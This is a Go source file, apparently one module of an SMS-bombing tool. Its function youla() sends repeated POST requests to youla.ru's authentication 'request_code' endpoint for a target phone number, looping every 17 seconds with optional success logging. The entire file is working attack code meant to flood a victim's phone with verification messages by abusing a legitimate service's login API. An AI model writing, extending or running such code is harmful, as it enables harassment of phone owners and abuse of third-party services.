package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func youla() {
	req := newreq()
	req.SetBodyString("phone=" + num)
	req.SetRequestURI("https://youla.ru/web-api/auth/request_code")
	req.Header.SetMethod("POST")

	timeout := time.Second * 17
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `"phone"`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
